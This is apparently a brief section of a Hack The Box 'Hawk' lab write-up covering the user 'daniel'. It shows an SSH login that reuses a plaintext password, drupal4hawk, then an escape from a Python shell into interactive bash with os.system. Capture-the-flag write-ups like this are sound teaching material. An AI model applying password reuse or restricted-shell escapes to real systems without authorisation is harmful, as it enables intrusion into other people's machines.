# 17 - Daniel


# Linpeas.sh
![](vx_images/1913842608835.png)


# Password reuse
```bash
┌─[user@parrot]─[10.10.14.3]─[~/htb/hawk/www/chisel]
└──╼ $ ssh -l daniel 10.10.10.102
daniel@10.10.10.102's password: drupal4hawk
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-23-generic x86_64)
...
Last login: Mon Jun 28 17:47:49 2021 from 10.10.14.3
Python 3.6.5 (default, Apr  1 2018, 05:46:30) 
[GCC 7.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.system("/bin/bash -i")
daniel@hawk:~$ id
uid=1002(daniel) gid=1005(daniel) groups=1005(daniel)
daniel@hawk:~$ 
```
